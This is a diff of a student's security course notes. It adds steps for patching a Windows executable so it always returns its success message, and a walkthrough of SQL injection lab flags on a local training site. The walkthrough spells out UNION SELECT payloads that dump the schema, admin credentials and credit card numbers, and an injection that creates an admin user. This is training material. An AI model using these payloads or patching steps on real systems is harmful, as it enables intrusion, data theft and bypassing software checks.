@@ -1473,23 +1473,6 @@ mem2:
 ```
 
 
-
-
-
-## Portable Executable Patching/ Software Anaylsis
-
-Perform Debugging and Disassembly
-
-Find the Success/Failure
-
-Adjust Instructions
-
-Apply Patch and Save
-
-Execute Patched Binary
-
-
-
 ## Windows Ops Executable (DEMO 1)
 
 xfreerdp /u:student /v:10.50.21.242 -dynamic-resolution +glyph-cache +clipboard
@@ -1656,4 +1639,108 @@ C:\Users\student>pscp student@10.50.37.42:/home/student/Downloads/* C:\Users\stu
 student@10.50.37.42's password:                                                                                        
 entry.exe                 | 110 kB | 110.5 kB/s | ETA: 00:00:00 | 100%                                                  
 ntry.c                   | 0 kB |   0.3 kB/s | ETA: 00:00:00 | 100% 
+
+
+
+
+
+## Portable Executable Patching/ Software Anaylsis (DEMO)
+
+Perform Debugging and Disassembly
+
+Find the Success/Failure
+
+Adjust Instructions
+
+Apply Patch and Save
+
+Execute Patched Binary
+
+1. Find Success Statement
+2. Modify so you always receive the Success Statement
+3. Run the Binary
+
+
+
+DEMO1.exe 
+In this demo we take an EXE and we modify the success statement and make it always return Successful
+
+1. Strings and search for key word.
+2. Double Click the function that is referenced from the key word.
+3. Find Success Statement and work backwards
+4. Follow the value that returns the Success Statement back to the function
+5. Write Click intruction and Patch Instruction to always return the value that returns Success
+6. File -> Export Program -> Format "PE" -> Change Name --> Export
+7. Run the program and see if the changes return the Success
+
+
+
+
+# SQL INJECTION PRACTICE
+## Categories Page (FLAG)
+1. Click 1st Category to Populate the Products by Category Database
+2. Within the URL you notice: http://127.0.0.1:2500/cases/productsCategory.php?category=1
+3. You can input commands after the category=1 placement
+4. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT 1,2,3(4,5,6, etc)
+	This will allow you to see how big the table is and let you feel for the database size.
+5. Once you know the size of the database you can use the golden statement to get all the information on the database
+6. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
+	This will populate the entire database with the Table Schema, Table Name, and Column  Names within the database making it easier to call information out.
+7. The flag can be found within the sqlinjection.products search
+
+http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT category,name,description FROM sqlinjection.products
+
+
+## Admin Credentials (FLAG)
+1. To find this flag we are able to use the same URL in the top to query
+2. We need ADMIN Password so we will query using this UNION SELECT Statement
+http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT username,password,firstname FROM sqlinjection.members
+3. This pulls username,password,first_name from the sqlinjection.members database
+4. From there we are able to see the administrator credentials
+
+
+## PRODUCTS (FLAG)
+1. Using the Search Bar we are asked to locate a flag from the page
+2. First we need to test the Input Search Box to see if its vulnerable
+3. Enter something legitemate "RAM' followed by the truth statement OR 1 = '1 (ex. ram' or 1 = '1)
+4. If information is given after the truth statement try then it is vulnerable to queries
+5. Now we run the UNION SELECT 1,2(3,4,5) to see how big the fields are
+6. Once we know the size of the fields we can use the golden statement (UNION SELECT table_schema,table_name FROM information_schema.columns)
+
+## Version (FLAG)
+1. In order to get this flag we will need to search for @@version within the information_schema.columns database
+2. Using the Search page ram' UNION SELECT @@version,2 from information_schema.columns #
+3. Using the URL ...category=1 UNION SELECT @@version,2,3 from information_schema.columns
+4. We need to add the 2,3,(4,5) depending on the size of the fields
+5. @@version returns the version of the database
+
+
+## Credit CARD (FLAG)
+1. Budget PAGE
+2. WE utilized the categories page URL method to query information
+3. We got creditcard information from using the following query
+4. http://127.0.0.1:2500/cases/productsCategory.php?category=1 UNION SELECT id,creditcard_number,date from sqlinjection.payments
+
+## ID Search (FLAG)
+1. To get the ID FLAG we received a HINT to look left and look right
+2. In order to get this flag we used the following query reorder to see ID on the right and not the left
+3. UNION SELECT comment,data,id FROM share4
+4. Keys to the Kingdom	Nk43UmI3MTNaSmkxdVVINUplN28K	1337
+5. The FLAG was just encoded with BASE64
+
+## Create an ADMIN USER (FLAG)
+
+1. Using /cases/register.php we are asked to create a user with admin permissions ensuring the First Name is set to Hacker
+2. Create a normal account and view query in order to see the formatting of what is being submitted to create the account
+3. INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('soem', 'some', 'some', 'some', 'some', 3)
+4. Once this is identified find which field can be used to create this SQL Injection (username)
+5. Create your own QUERY to create the ADMIN Account
+6. INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Hacker', '1', '1', '1', 3)
+7. See the query to see what is being ran. We can input our own code and modify it to make our own adjustments
+8. (5' ,'1', '1', 1) -- ) is what we entered in the username field to create a user with username,password,and email 1 with permission field 1
+9. Flag was granted on loggin
+
+
+
+
 
